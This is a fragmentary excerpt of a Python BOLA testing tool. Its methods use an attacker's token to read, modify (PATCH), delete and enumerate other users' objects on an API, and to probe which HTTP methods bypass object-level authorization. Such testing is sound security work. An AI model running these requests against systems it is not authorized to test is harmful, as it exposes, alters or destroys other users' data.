...
class BOLATestAgent:
    ...
    def get_user_objects(self, token, profile_path="/users/me", objects_path="/orders"):
        ...
        if objects_resp and objects_resp.status_code == 200:
            ...
            items = (
                ...
                else data.get("items", data.get("data", data.get("orders", [])))
            )
            object_ids = [item.get("id") for item in items if item.get("id")]

        return user_id, object_ids

    def test_horizontal_read(
        self, attacker_token, victim_object_ids, resource_path="/orders"
    ):
    ...
    def test_horizontal_write(
        self, attacker_token, victim_object_ids, resource_path="/orders", payload=None
    ):
        ...
        for oid in victim_object_ids:
            resp = self._req(
                "PATCH", f"{resource_path}/{oid}", headers=headers, data=test_payload
            )
    ...
    def test_horizontal_delete(
        self, attacker_token, victim_object_id, resource_path="/orders"
    ):
        ...
        resp = self._req(
            "DELETE", f"{resource_path}/{victim_object_id}", headers=headers
        )
        vulnerable = resp and resp.status_code in (200, 204)
        if vulnerable:
            self.findings.append(
    ...
    def test_id_enumeration(
        self, attacker_token, known_id, resource_path="/orders", range_offset=5
    ):
    ...
    def test_method_bypass(
        self, attacker_token, victim_object_id, resource_path="/users"
    ):
        ...
        for method in ["GET", "PUT", "PATCH", "DELETE", "HEAD"]:
            ...
            resp = self._req(
                method,
                f"{resource_path}/{victim_object_id}",
                headers=headers,
                data=data,
            )
...
def main():
    ...
    if "--victim-ids" in sys.argv:
        victim_ids = [
            int(x) for x in sys.argv[sys.argv.index("--victim-ids") + 1].split(",")
        ]
